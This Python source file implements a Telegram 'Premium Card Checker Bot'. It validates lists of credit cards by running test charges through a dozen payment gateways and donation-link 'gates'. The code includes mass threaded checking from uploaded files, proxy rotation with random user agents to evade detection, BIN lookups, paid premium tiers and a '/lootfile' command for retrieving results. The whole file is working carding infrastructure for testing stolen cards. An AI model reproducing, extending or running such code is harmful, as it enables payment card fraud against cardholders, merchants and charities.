        bin_to_check = cc[:6]
        bin_url = "https://bins.antipublic.cc/bins/" + bin_to_check
        bin_headers = {"user-agent": random_user_agent(), "Pragma": "no-cache", "Accept": "*/*"}
        bin_response, error = make_request_with_retry(session, 'get', bin_url, headers=bin_headers, timeout=10, cancellation_event=cancellation_event)
        
        if error:
            return 'cancelled' if "cancelled" in error else 'error', line, f"BIN Check Error: {error}", {}
        
        if bin_response:
            response_text_lower = bin_response.text.lower()
            if "not found" in response_text_lower and ('"detail":' in response_text_lower or bin_response.status_code != 200):
                return 'decline', line, 'INVALID_BIN_DECLINE', {}
            
            if bin_response.status_code == 200:
                try:
                    data = bin_response.json()
                    if isinstance(data, dict):
                        bin_info.update(data)
                    else:
                        logger.warning(f"BIN API returned non-dictionary data for BIN {bin_to_check}: {data}")
                except json.JSONDecodeError:
                    logger.warning(f"Error parsing JSON from BIN check for BIN {bin_to_check}")

        
        country_name_str = bin_info.get('country_name') or ''
        if country_name_str.upper() == 'VIETNAM':
            return 'decline', line, 'VIETNAM_BIN_DECLINE', bin_info
        
        active_gate = get_active_gate()
        
        if active_gate == 'special': # --- NEW: Call the special multi-link checker
            return check_card_multi_link(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_multi_link_mode, _get_charge_value, custom_charge_amount)
        elif active_gate == '3':
            return check_card_gate3(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_gate3_mode, _get_charge_value, custom_charge_amount)
        elif active_gate == '4':
            return check_card_gate4(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, _get_charge_value, custom_charge_amount)
        elif active_gate == '5':
            return check_card_gate5(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_gate5_mode, _get_charge_value, custom_charge_amount)
        elif active_gate == '6':
            return check_card_gate6(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, _get_charge_value, custom_charge_amount)
        elif active_gate == '7':
            return check_card_gate7(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, custom_charge_amount)
        elif active_gate == '8':
            return check_card_gate8(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_gate8_mode, _get_charge_value, custom_charge_amount)
        elif active_gate == '9':
            return check_card_gate9(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_gate9_mode, _get_charge_value, custom_charge_amount)
        elif active_gate == '10':
            return check_card_gate10(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_gate10_mode, _get_charge_value, custom_charge_amount)
        elif active_gate == '11':
            return check_card_gate11(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_gate11_mode, _get_charge_value, custom_charge_amount)
        elif active_gate == '12':
            return check_card_gate12(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_gate12_mode, _get_charge_value, custom_charge_amount)
        else:
            # Fallback for gates still in the main file
            gate_functions = {
                '1': _check_card_gate1,
                '2': _check_card_gate2,
            }
            gate_func = gate_functions.get(active_gate)
            if gate_func:
                 return gate_func(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, custom_charge_amount)
            else:
                 # Default to gate 6 if active_gate is invalid
                 return check_card_gate6(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, _get_charge_value, custom_charge_amount)


    except Exception as e:
        logger.error(f"Unknown error in check_card for line '{line}': {e}", exc_info=True)
        return 'error', line, f"Unknown System Error: {e}", bin_info

def check_card_with_retry(line, cancellation_event=None, custom_charge_amount=None):
    """
    Wrapper for check_card to retry on specific HTTP errors.
    Returns: status, original_line, full_response, bin_info, had_persistent_error (bool)
    """
    proxy_config = load_proxies()
    # Retry 20 times if proxy is on, otherwise 10 times.
    max_retries = 20 if proxy_config.get("enabled") and proxy_config.get("proxies") else 10

    for attempt in range(max_retries):
        if cancellation_event and cancellation_event.is_set():
            return 'cancelled', line, 'User cancelled', {}, False

        status, original_line, full_response, bin_info = check_card(line, cancellation_event, custom_charge_amount)
        
        is_http_error = (
            status == 'error' and 
            ("HTTP Error" in str(full_response) or "Proxy Error" in str(full_response) or "Connection Error" in str(full_response))
        )
        
        if is_http_error and proxy_config.get("enabled") and proxy_config.get("proxies"):
            logger.warning(f"Card {line} encountered a proxied HTTP error. Attempt {attempt + 1}/{max_retries}. Retrying in 2s...")
            time.sleep(2) # Add a small delay before retrying
            continue # Move to the next attempt
        else:
            # Not the target error, or success/failure, return the result immediately
            return status, original_line, full_response, bin_info, False

    # If the loop finishes, it means all retries failed with the HTTP error
    logger.error(f"Card {line} has a persistent HTTP error after {max_retries} attempts.")
    error_message = (
        f"Persistent HTTP/Proxy error after {max_retries} attempts. Both Request 1 (Tokenize) and Request 2 (Payment) "
        f"may have failed. Final response from the last attempt: {full_response}"
    )
    return 'error', line, error_message, {}, True


def create_progress_bar(current, total, length=10):
    if total == 0: return "[‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë] 0%"
    fraction = current / total
    filled_len = int(length * fraction)
    bar = '‚ñà' * filled_len + '‚ñë' * (length - filled_len)
    return f"[{bar}] {int(fraction * 100)}%"

def get_flag_emoji(country_code):
    if not country_code or len(country_code) != 2: return ''
    try:
        return ''.join(chr(0x1F1E6 + ord(char.upper()) - ord('A')) for char in country_code)
    except Exception:
        return ''

# --- BOT COMMANDS ---
async def start(update, context):
    user = update.effective_user

    if user.id in load_users() or user.id == ADMIN_ID:
        await update.message.reply_text(f"**Welcome back, {user.first_name}!**\nUse /help to see the available commands.")
    else:
        welcome_message = (
            "**Welcome to the Premium Card Checker Bot!** ü§ñ\n\n"
            "This bot utilizes a powerful `Charge Api Auth` to provide accurate card checking services.\n\n"
            "**Your current status:** `GUEST`\n"
            f"Your Telegram ID: `{user.id}`\n\n"
            "**üåü Upgrade to Premium! üåü**\n"
            "Unlock the full potential of the bot with a Premium membership:\n"
            "‚úÖ **Unlimited Checking:** No restrictions on the number of cards you can check.\n"
            "‚úÖ **Priority Support:** Get faster assistance from the admin.\n\n"
            f"To get access and upgrade to Premium, please contact the admin with your ID: {ADMIN_USERNAME}"
        )
        await update.message.reply_text(welcome_message)

async def info(update, context):
    await update.message.reply_text(f"üÜî Your Telegram ID is: `{update.effective_user.id}`")

async def get_help_text(user: User):
    user_id = user.id
    user_mass_limit = get_user_limit(user_id)
    user_multi_limit = get_user_multi_limit(user_id)

    active_gate = get_active_gate()
    active_gate_name = get_formatted_gate_name(active_gate)
    gate_status_line = f"\n‚ÑπÔ∏è **Current Card Check Gate:** `{active_gate_name}`"
    
    new_commands = (
        "\n**Website Checker:**\n"
        "üîπ `/site <website.com>`\n"
        "   - *Description:* Checks a single website's info (Gateway, Captcha, etc.).\n\n"
        "üîπ `/sitem`\n"
        "   - *Description:* Checks multiple websites at once (max 10).\n"
    )

    texts = {
        "public": (
            "**Public Command Menu** üõ†Ô∏è\n"
            "Welcome! Here are the basic commands you can use:\n\n"
            "üîπ `/start`\n"
            "   - *Description:* Starts the bot and gets your Telegram ID.\n\n"
            "üîπ `/info`\n"
            "   - *Description:* Quickly retrieves your Telegram ID again.\n\n"
            "üîπ `/help`\n"
            "   - *Description:* Displays this help menu.\n\n"
            f"**Upgrade to Premium:**\nTo use unlimited checking features, please contact the Admin: {ADMIN_USERNAME}"
        ),
        "member": (
            "**Member Command Menu** üë§\n"
            "You are authorized! Use these commands:\n\n"
            "**Card Checker:**\n"
            "üîπ `/cs <card>`\n"
            "   - *Description:* Checks a single credit card.\n\n"
            "üîπ `/bin <bin>`\n"
            "   - *Description:* Retrieves information for a card's BIN.\n\n"
            "üîπ `/multi`\n"
            f"   - *Description:* Checks multiple cards in one message (max {user_multi_limit} cards).\n\n"
            "üîπ `/mass<threads>`\n"
            "   - *Description:* Checks a list of cards from a `.txt` file.\n\n"
            "üîπ `/stop`\n"
            "   - *Description:* Stops your currently running /mass or /multi task.\n"
            f"{new_commands}\n"
            f"üí≥ **/mass Limit:** `{user_mass_limit}` lines/file.\n"
            f"üåü **Upgrade to Premium:** Contact {ADMIN_USERNAME} for unlimited checking."
        )
    }

    admin_commands = (
        "**Administrator Command Menu** üëë\n"
        "Full control over the bot with these commands:\n\n"
        "**Bot & Check Management:**\n"
        "üîπ `/on`, `/off` - Turn the bot on/off.\n"
        "üîπ `/status` - Check the status of the payment gates.\n"
        "üîπ `/gate [1-12]` - Change the active check gate.\n"
        "üîπ `/setgate <id> <min> <max>` - Set the charge range for a gate.\n"
        "üîπ `/stop <user_id>` - Stop a user's task.\n"
        "üîπ `/cs<amount> <card>` - Check with a custom charge amount.\n\n"
        "**Proxy Management:**\n"
        "üîπ `/onprx`, `/offprx` - Enable/Disable proxy usage.\n"
        "üîπ `/addprx <proxy>` - Add and test a new proxy.\n"
        "üîπ `/deleteprx` - View and delete existing proxies.\n"
        "üîπ `/testprx` - Test the saved proxies.\n\n"
        "**User & Message Management:**\n"
        "üîπ `/add <user_id>`\n"
        "üîπ `/ban <user_id>`\n"
        "üîπ `/show` - View the user list.\n"
        "üîπ `/send <user_id> <message>`\n"
        "üîπ `/sendall <message>`\n\n"
        "**Limit Management:**\n"
        "üîπ `/addlimit <user_id> <number>`\n"
        "üîπ `/addlimitmulti <user_id> <number>`\n\n"
        "**Monitoring & History:**\n"
        "üîπ `/active` - View currently running tasks.\n"
        "üîπ `/showcheck` - View user check statistics.\n"
        "üîπ `/lootfile <user_id>` - Retrieve result files.\n\n"
        "**Special Multi-Link Mode:**\n"
        "üîπ `/dalink` - Activate the Multi-Link checking mode.\n"
        "üîπ `/addlink <url(s)>` - Add and validate new donation links.\n"
        "üîπ `/deletelink` - View, manage, and delete saved links.\n"
        "üîπ `/statusdalink` - Check the status of all saved links."
    )
    
    if user_id == ADMIN_ID:
        member_help_base = texts['member'].split('üí≥ **/mass Limit:**')[0].strip()
        return f"{admin_commands}{gate_status_line}\n\n{member_help_base}"
    elif user_id in load_users():
        return f"{texts['member']}{gate_status_line}"
    else:
        return texts['public']

async def help_command(update, context):
    user = update.effective_user
    help_text = await get_help_text(user)
    await update.message.reply_text(help_text, disable_web_page_preview=True)

async def add_user(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args: await update.message.reply_text("Usage: `/add <user_id>`"); return
    try:
        user_to_add = int(context.args[0])
        users = load_users()
        if user_to_add in users:
            await update.message.reply_text(f"‚ÑπÔ∏è User `{user_to_add}` is already in the list.")
        else:
            users.add(user_to_add)
            save_users(users)
            await update.message.reply_text(f"‚úÖ Added user `{user_to_add}`.")
    except ValueError: await update.message.reply_text("‚ùå Invalid User ID.")

async def ban_user(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args: await update.message.reply_text("Usage: `/ban <user_id>`"); return
    try:
        user_to_ban = int(context.args[0])
        users = load_users()
        if user_to_ban in users:
            users.discard(user_to_ban)
            save_users(users)
            user_log_dir = os.path.join(LOG_DIR, str(user_to_ban))
            if os.path.exists(user_log_dir):
                shutil.rmtree(user_log_dir)
            await update.message.reply_text(f"üóë Removed user `{user_to_ban}` and all their logs.")
        else:
            await update.message.reply_text(f"‚ÑπÔ∏è User `{user_to_ban}` not found.")
    except ValueError: await update.message.reply_text("‚ùå Invalid User ID.")

async def show_users(update, context):
    if update.effective_user.id != ADMIN_ID: return
    users = load_users()
    if not users:
        await update.message.reply_text("üì≠ The user list is empty."); return
    
    message_lines = ["üë• **User ID & Limits List:**\n"]
    for user_id in sorted(list(users)):
        limit_mass = get_user_limit(user_id)
        limit_multi = get_user_multi_limit(user_id)
        message_lines.append(f"- `{user_id}` | Mass: `{limit_mass}` | Multi: `{limit_multi}`")
        
    await update.message.reply_text("\n".join(message_lines))

async def add_limit_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if len(context.args) != 2:
        await update.message.reply_text("Usage: `/addlimit <user_id> <lines_to_add>`"); return
    try:
        target_user_id_str, amount_to_add_str = context.args
        amount_to_add = int(amount_to_add_str)
        if not target_user_id_str.isdigit() or amount_to_add <= 0:
            raise ValueError
    except (ValueError, IndexError):
        await update.message.reply_text("‚ùå Invalid data. Please ensure the ID and amount are numbers."); return

    limits = load_json_file(LIMIT_FILE)
    old_limit = int(limits.get(target_user_id_str, DEFAULT_MEMBER_LIMIT))
    new_limit = old_limit + amount_to_add
    limits[target_user_id_str] = new_limit
    save_json_file(LIMIT_FILE, limits)
    
    await update.message.reply_text(f"‚úÖ **/mass Limit Updated Successfully!**\n\n"
                                          f"üë§ **User ID:** `{target_user_id_str}`\n"
                                          f"üìà **Old Limit:** `{old_limit}`\n"
                                          f"‚ûï **Added:** `{amount_to_add}`\n"
                                          f"üìä **New Total:** `{new_limit}`")

async def add_multi_limit_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if len(context.args) != 2:
        await update.message.reply_text("Usage: `/addlimitmulti <user_id> <cards_to_add>`"); return
    try:
        target_user_id_str, amount_to_add_str = context.args
        amount_to_add = int(amount_to_add_str)
        if not target_user_id_str.isdigit() or amount_to_add <= 0:
            raise ValueError
    except (ValueError, IndexError):
        await update.message.reply_text("‚ùå Invalid data. Please ensure the ID and amount are numbers."); return

    limits = load_json_file(MULTI_LIMIT_FILE)
    old_limit = int(limits.get(target_user_id_str, DEFAULT_MULTI_LIMIT))
    new_limit = old_limit + amount_to_add
    limits[target_user_id_str] = new_limit
    save_json_file(MULTI_LIMIT_FILE, limits)
    
    await update.message.reply_text(f"‚úÖ **/multi Limit Updated Successfully!**\n\n"
                                          f"üë§ **User ID:** `{target_user_id_str}`\n"
                                          f"üìà **Old Limit:** `{old_limit}`\n"
                                          f"‚ûï **Added:** `{amount_to_add}`\n"
                                          f"üìä **New Total:** `{new_limit}`")

async def _bin_command_worker(update, context):
    """Worker function for the /bin command."""
    user = update.effective_user
    if user.id != ADMIN_ID and user.id not in load_users():
        await update.message.reply_text(f"You are not authorized to use this command. Please contact the Admin: {ADMIN_USERNAME}")
        return

    if not context.args or not context.args[0].isdigit() or not (6 <= len(context.args[0]) <= 8):
        await update.message.reply_text("Please provide a valid BIN (6-8 digits).\nUsage: `/bin <bin_number>`")
        return
    
    bin_to_check = context.args[0]
    msg = await update.message.reply_text(f"‚è≥ Checking BIN `{bin_to_check}`...")

    try:
        session = requests.Session()
        ua = random_user_agent()
        session.headers.update({"User-Agent": ua})
        
        bin_url = "https://bins.antipublic.cc/bins/" + bin_to_check
        bin_response, error = make_request_with_retry(session, 'get', bin_url, timeout=10)

        if error or not bin_response or bin_response.status_code != 200 or "not found" in bin_response.text.lower():
            await msg.edit_text(f"‚ùå No information found for BIN `{bin_to_check}`."); return

        bin_info = bin_response.json()

        brand = (bin_info.get('brand') or 'N/A').upper()
        card_type = (bin_info.get('type') or 'N/A').upper()
        level = (bin_info.get('level') or 'N/A').upper()
        bank = bin_info.get('bank') or 'None'
        country_name = (bin_info.get('country_name') or 'N/A').upper()
        country_code = bin_info.get('country_code')
        flag = get_flag_emoji(country_code)

        bin_info_parts = [p for p in [brand, card_type, level] if p and p != 'N/A']
        bin_info_line = " ‚Äì ".join(bin_info_parts)
        
        response_text = (
            f"üÜî **BIN:** {bin_info_line}\n"
            f"üèõÔ∏è **Bank:** {bank}\n"
            f"üåê **Country:** {country_name} {flag}"
        )

        final_message = f"‚ÑπÔ∏è **BIN Info:** `{bin_to_check}`\n\n{response_text}"
        await msg.edit_text(final_message)

    except json.JSONDecodeError:
        await msg.edit_text(f"‚ùå Error parsing data from the API for BIN `{bin_to_check}`.")
    except Exception as e:
        logger.error(f"Error in /bin: {e}", exc_info=True)
        await msg.edit_text(f"‚õîÔ∏è **System Error:** `{e}`")

async def bin_command(update, context):
    """(Tasked) Retrieves information for a card's BIN."""
    asyncio.create_task(_bin_command_worker(update, context))

async def _process_single_check(update, context, line, custom_charge_amount=None):
    """Function to handle the check logic for both /cs and /cs<amount>"""
    msg = await update.message.reply_text("‚è≥ *Checking your card, please wait...*")
    start_time = time.time()
    try:
        status, original_line, full_response, bin_info = await asyncio.to_thread(
            check_card, line, custom_charge_amount=custom_charge_amount
        )
        duration = time.time() - start_time

        user = update.effective_user
        if status in ['error', 'unknown'] and user.id != ADMIN_ID:
            debug_info = f"üêû DEBUG ALERT (/cs from user {user.id}):\nCard: {original_line}\nResponse: {str(full_response)[:3500]}"
            await context.bot.send_message(chat_id=ADMIN_ID, text=debug_info)

        active_gate = get_active_gate()
        gate_name = get_formatted_gate_name(active_gate)
        
        if custom_charge_amount is not None:
            amount_in_usd = custom_charge_amount / 100.0
            gate_name = f"Custom Charge {amount_in_usd:.2f}$ (Gate {active_gate})"

        is_charge_mode = False
        mode_check_map = {
            '1': get_gate1_mode, '2': get_gate2_mode, '3': get_gate3_mode, '5': get_gate5_mode,
            '8': get_gate8_mode, '9': get_gate9_mode, '10': get_gate10_mode, '11': get_gate11_mode,
            '12': get_gate12_mode, 'special': get_multi_link_mode
        }
        
        if active_gate in ['4', '6']:
            is_charge_mode = True
        elif active_gate in mode_check_map and mode_check_map[active_gate]() == 'charge':
            is_charge_mode = True

        if custom_charge_amount is not None:
            is_charge_mode = True

        if status == 'gate_dead':
            final_message = (f"**üí† CARD CHECK RESULT üí†**\n\n"
                             f"**üí≥ Card:** `{original_line}`\n"
                             f"**üö¶ Status: ‚ùå GATE DIED**\n"
                             f"**üí¨ Response:** `The payment gateway is currently down. Please contact the admin.`\n\n"
                             f"**üè¶ Gateway:** `{gate_name}`\n"
                             f"**‚è±Ô∏è Took:** `{duration:.2f}s`\n\n"
                             f"üë§ *Checker by: {ADMIN_USERNAME}*")
            await msg.edit_text(final_message)
            return
        
        decline_reasons = {
            'VIETNAM_BIN_DECLINE': (f"DECLINED (Vietnam BIN)", gate_name),
            'INVALID_BIN_DECLINE': ("Invalid Card Number (BIN not found)", "BIN Check"),
            'EXPIRED_CARD_DECLINE': ("Card Expired", "Pre-Check"),
            'INVALID_CARDNUMBER_DECLINE': ("Invalid Card Number", "Datatrans Tokenize"),
            'CARD_NOT_ALLOWED_DECLINE': ("Card Not Supported", "Datatrans Tokenize"),
        }

        if status == 'decline' and full_response in decline_reasons:
            response_msg, decline_gate = decline_reasons[full_response]
            final_message = (f"**üí† CARD CHECK RESULT üí†**\n\n"
                             f"**üí≥ Card:** `{original_line}`\n"
                             f"**üö¶ Status: ‚ùå DECLINED**\n"
                             f"**üí¨ Response:** `{response_msg}`\n\n"
                             f"**üè¶ Gateway:** `{decline_gate}`\n\n"
                             f"**‚è±Ô∏è Took:** `{duration:.2f}s`\n\n"
                             f"üë§ *Checker by: {ADMIN_USERNAME}*")
        else:
            status_text = ""
            response_message = ""
            
            status_map = {
                'custom': ("üîí 3D SECURE", full_response),
                'invalid_format': ("üìã FORMAT ERROR", full_response),
                'error': ("‚ùóÔ∏è ERROR", full_response),
                'unknown': ("‚ùî UNKNOWN", full_response),
            }

            if status == 'live_success':
                status_text = "‚úÖ Approved"
                response_message = "Card Added Successfully üí≥"
            elif status == 'decline':
                status_text = "‚ùå DECLINED"
                response_message = "Card Declined"
            elif status == 'success':
                try:
                    amount_charged_raw = int(full_response.split('_')[1])
                    amount_in_usd = amount_charged_raw / 100.0
                    status_text = f"‚úÖ CHARGED {amount_in_usd:.2f}$"
                    response_message = f"Transaction successful for {amount_in_usd:.2f}$."
                except (ValueError, IndexError):
                    status_text = "‚úÖ CHARGED"
                    response_message = "Transaction successful!"
            else:
                status_text, response_message = status_map.get(status, status_map['unknown'])

            brand = (bin_info.get('brand') or 'N/A').upper()
            card_type = (bin_info.get('type') or 'N/A').upper()
            level = (bin_info.get('level') or 'N/A').upper()
            bank = (bin_info.get('bank') or 'None')
            country_name = (bin_info.get('country_name') or 'N/A').upper()
            country_code = bin_info.get('country_code')
            flag = get_flag_emoji(country_code)
            
            bin_info_parts = [p for p in [brand, card_type, level] if p and p != 'N/A']
            bin_info_line = " ‚Äì ".join(bin_info_parts)

            bin_details_str = (
                f"üÜî **BIN:** {bin_info_line}\n"
                f"üèõÔ∏è **Bank:** {bank}\n"
                f"üåê **Country:** {country_name} {flag}"
            )
            
            response_display_part = ""
            if is_charge_mode and status == 'custom':
                response_display_part = f"**üí¨ Response:** `3D Secure Required`"
            elif status == 'unknown':
                if user.id == ADMIN_ID:
                    safe_response = str(response_message)[:1000]
                    response_display_part = f"**üí¨ Response:**\n```json\n{safe_response}\n```"
                else:
                    response_display_part = f"**üí¨ Response:** `Unknown`"
            elif status in ['custom', 'invalid_format', 'error']:
                safe_response = str(response_message)[:1000]
                response_display_part = f"**üí¨ Response:**\n```json\n{safe_response}\n```"
            else:
                response_display_part = f"**üí¨ Response:** `{response_message}`"

            final_message = (f"**üí† CARD CHECK RESULT üí†**\n\n"
                             f"**üí≥ Card:** `{original_line}`\n"
                             f"**üö¶ Status: {status_text}**\n"
                             f"{response_display_part}\n\n"
                             f"‚ÑπÔ∏è **BIN Info:**\n{bin_details_str}\n\n"
                             f"**üè¶ Gateway:** `{gate_name}`\n\n"
                             f"**‚è±Ô∏è Took:** `{duration:.2f}s`\n\n"
                             f"üë§ *Checker by: {ADMIN_USERNAME}*")
        
        await msg.edit_text(final_message)
        
    except Exception as e:
        logger.error(f"Error in _process_single_check function: {e}", exc_info=True)
        safe_error_message = str(e).replace('`', "'")
        await msg.edit_text(f"‚õîÔ∏è **System Error:**\n```\n{safe_error_message}\n```")

async def _cs_command_worker(update, context):
    """Worker function for the /cs command."""
    user = update.effective_user
    
    if user.id != ADMIN_ID and user.id not in load_users():
        await update.message.reply_text(f"You are not authorized to use this command. Please contact the Admin: {ADMIN_USERNAME}")
        return
    if user.id != ADMIN_ID and not is_bot_on():
        await update.message.reply_text(MESSAGES["bot_off"])
        return

    if not context.args: await update.message.reply_text("Usage: `/cs cc|mm|yy|cvv` or `/cs cc|mm/yy|cvv`"); return
    
    line = " ".join(context.args)
    await _process_single_check(update, context, line)

async def cs_command(update, context):
    """(Tasked) Checks a single credit card."""
    asyncio.create_task(_cs_command_worker(update, context))

async def _cs_custom_amount_command_worker(update, context):
    """Worker for the admin's /cs<amount> command."""
    user = update.effective_user
    
    if user.id != ADMIN_ID:
        return
        
    if not is_bot_on():
        await update.message.reply_text(MESSAGES["bot_off"])
        return

    match = re.match(r'/cs(\d+)', update.message.text, re.IGNORECASE)
    if not match: return
        
    try:
        custom_charge_amount = int(match.group(1))
    except (ValueError, IndexError):
        await update.message.reply_text("‚ùå Invalid charge amount.")
        return

    card_info_str = update.message.text[len(match.group(0)):].strip()
    if not card_info_str:
        await update.message.reply_text(f"Usage: `/cs{custom_charge_amount} cc|mm|yy|cvv`")
        return
        
    await _process_single_check(update, context, card_info_str, custom_charge_amount=custom_charge_amount)

async def cs_custom_amount_command(update, context):
    """(Tasked) Handler for the admin's /cs<amount> command."""
    asyncio.create_task(_cs_custom_amount_command_worker(update, context))


async def _multi_check_worker(update, context):
    """Worker function for the /multi command."""
    user = update.effective_user
    
    if user.id != ADMIN_ID and user.id not in load_users():
        await update.message.reply_text(f"You are not authorized to use this command. Please contact the Admin: {ADMIN_USERNAME}")
        return
        
    if user.id != ADMIN_ID and not is_bot_on():
        await update.message.reply_text(MESSAGES["bot_off"])
        return
        
    if user.id in ACTIVE_CHECKS:
        await update.message.reply_text("You already have another check task running. Please wait for it to complete or use /stop.", quote=True)
        return

    text_content = update.message.text.split('/multi', 1)[-1].strip()
    if not text_content:
        await update.message.reply_text("Usage: Use `/multi` and then paste your card list on the next line."); return

    lines = [line.strip() for line in text_content.splitlines() if line.strip()]
    total_lines = len(lines)

    if total_lines == 0:
        await update.message.reply_text("No cards to check."); return

    if user.id != ADMIN_ID:
        user_limit = get_user_multi_limit(user.id)
        if total_lines > user_limit:
            await update.message.reply_text(
                f"‚õîÔ∏è **Limit Exceeded!**\n\n"
                f"You sent `{total_lines}` cards, but your limit for the /multi command is `{user_limit}` cards at a time.\n\n"
                f"To increase your limit, please contact the admin {ADMIN_USERNAME}."
            )
            return

    active_gate = get_active_gate()
    gate_name = get_formatted_gate_name(active_gate)
    
    keyboard = [[InlineKeyboardButton("üõë Stop My Task", callback_data=f"stop_mytask_{user.id}")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    status_message = await update.message.reply_text(f"‚è≥ Initializing... Preparing to check `{total_lines}` cards via **{gate_name}**.", reply_markup=reply_markup)
    start_time = time.time()
    
    cancel_event = threading.Event()
    loop = asyncio.get_running_loop()
    try:
        ACTIVE_CHECKS[user.id] = {
            "full_name": user.full_name,
            "username": user.username,
            "start_time": time.time(),
            "task_type": "multi"
        }
        CANCELLATION_EVENTS[user.id] = cancel_event

        counts = {'success': 0, 'live_success': 0, 'decline': 0, 'custom': 0, 'error': 0, 'invalid_format': 0, 'unknown': 0, 'cancelled': 0, 'gate_dead': 0}
        results = {k: [] for k in counts.keys()}
        processed_count = 0
        last_update_time = time.time()
        num_threads = min(10, total_lines) 
        gate_died_flag = False
        stopped_due_to_http_error = False
        persistent_http_error_count = 0
        gate_fail_card = ""

        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            future_to_line = {executor.submit(check_card_with_retry, line, cancel_event): line for line in lines}
            for future in as_completed(future_to_line):
                if cancel_event.is_set():
                    break

                processed_count += 1
                try:
                    status, original_line, full_response, bin_info, had_persistent_error = future.result()
                    
                    if user.id != ADMIN_ID and status in ['error', 'unknown']:
                        debug_info = f"üêû DEBUG ALERT (/multi from user {user.id}):\nCard: {original_line}\nResponse: {str(full_response)[:3500]}"
                        coro = context.bot.send_message(chat_id=ADMIN_ID, text=debug_info)
                        asyncio.run_coroutine_threadsafe(coro, loop)

                    if had_persistent_error:
                        persistent_http_error_count += 1
                        results['error'].append(f"‚ùóÔ∏è `{original_line}` | Persistent HTTP error: {full_response}")
                        proxy_config = load_proxies()
                        if proxy_config.get("enabled") and persistent_http_error_count > 10:
                            logger.error("Stopping /multi task due to too many persistent HTTP errors.")
                            stopped_due_to_http_error = True
                            cancel_event.set()
                        continue
                            
                    if status == 'gate_dead':
                        counts['gate_dead'] += 1
                        gate_fail_card = original_line
                        gate_died_flag = True
                        cancel_event.set()
                        continue

                    counts[status] = counts.get(status, 0) + 1
                    status_icons = {'success': '‚úÖ', 'live_success': '‚úÖ', 'decline': '‚ùå', 'custom': 'üîí', 'invalid_format': 'üìã', 'error': '‚ùóÔ∏è', 'unknown': '‚ùî', 'cancelled': 'üõë'}
                    
                    brand = (bin_info.get('brand') or 'N/A').upper()
                    card_type = (bin_info.get('type') or 'N/A').upper()
                    level = (bin_info.get('level') or 'N/A').upper()
                    bank = (bin_info.get('bank') or 'N/A')
                    country_name = (bin_info.get('country_name') or 'N/A').upper()
                    bin_parts = [p for p in [bank, brand, card_type, level, country_name] if p and p != 'N/A']
                    bin_str = " - ".join(bin_parts)

                    result_line = ""
                    decline_msgs = {
                        'VIETNAM_BIN_DECLINE': 'DECLINED (VN BIN)',
                        'INVALID_BIN_DECLINE': 'DECLINED (Invalid BIN)',
                        'EXPIRED_CARD_DECLINE': 'DECLINED (Expired)',
                        'INVALID_CARDNUMBER_DECLINE': 'DECLINED (Invalid Card Number)',
                        'CARD_NOT_ALLOWED_DECLINE': 'DECLINED (Not Supported)'
                    }
                    if status == 'decline':
                        decline_msg = decline_msgs.get(full_response, '')
                        result_line = f"{status_icons['decline']} `{original_line}`" + (f" | `{decline_msg}`" if decline_msg else "")
                    elif status == 'live_success':
                        result_line = f"{status_icons['live_success']} `{original_line}` | Approved | `{bin_str}`"
                    elif status == 'success':
                        try:
                            amount_charged_raw = int(full_response.split('_')[1])
                            amount_in_usd = amount_charged_raw / 100.0
                            charge_msg = f"| Charge {amount_in_usd:.2f}$ successfull"
                        except (ValueError, IndexError):
                            charge_msg = "| Charged Successfully"
                        result_line = f"{status_icons['success']} `{original_line}` | `{bin_str}` {charge_msg}"
                    elif status == 'invalid_format': result_line = f"{status_icons[status]} `{original_line}` | Reason: {str(full_response)[:50]}" 
                    elif status == 'cancelled': continue
                    elif status == 'error' and had_persistent_error: continue
                    else:
                        if status == 'unknown':
                            result_line = f"{status_icons.get(status, '‚ùî')} `{original_line}` | Unknown"
                        else: # For 'custom' and other non-persistent errors
                            result_line = f"{status_icons.get(status, '‚ùî')} `{original_line}` | `{bin_str}`"

                    if result_line: results[status].append(result_line)

                except Exception as e:
                    original_line = future_to_line[future]
                    logger.error(f"Error processing future for card {original_line}: {e}", exc_info=True)
                    counts['error'] += 1
                    results['error'].append(f"‚ùóÔ∏è `{original_line}` | Processing error: {e}")

                if time.time() - last_update_time > 2.0 or processed_count == total_lines:
                    progress_bar = create_progress_bar(processed_count, total_lines, length=20)
                    
                    cpu_usage = psutil.cpu_percent()
                    ram_usage = psutil.virtual_memory().percent

                    status_lines = [
                        f"**üöÄ Checking in progress...**\n{progress_bar}\n",
                        f"üíª **CPU:** `{cpu_usage}%` | **RAM:** `{ram_usage}%`",
                        f"**Gate:** `{gate_name}`",
                        f"**Progress:** `{processed_count}/{total_lines}`\n"
                    ]
                    
                    mode_check_map = {
                        '1': get_gate1_mode, '2': get_gate2_mode, '3': get_gate3_mode, '5': get_gate5_mode,
                        '8': get_gate8_mode, '9': get_gate9_mode, '10': get_gate10_mode, '11': get_gate11_mode,
                        '12': get_gate12_mode, 'special': get_multi_link_mode
                    }
                    is_charge_gate = (
                        active_gate in ['4', '6'] or
                        (active_gate in mode_check_map and mode_check_map[active_gate]() == 'charge')
                    )

                    if is_charge_gate:
                        status_lines.append(f"‚úÖ **Charged:** `{counts['success']}`")
                    
                    status_lines.extend([
                        f"‚úÖ **Approved:** `{counts['live_success']}`",
                        f"‚ùå **Declined:** `{counts['decline']}`",
                        f"üîí **3D Secure:** `{counts['custom']}` | ‚ùî **Errors:** `{counts['error']}`"
                    ])
                    status_text = "\n".join(status_lines)

                    try:
                        current_reply_markup = reply_markup if not cancel_event.is_set() else None
                        await status_message.edit_text(text=status_text, reply_markup=current_reply_markup)
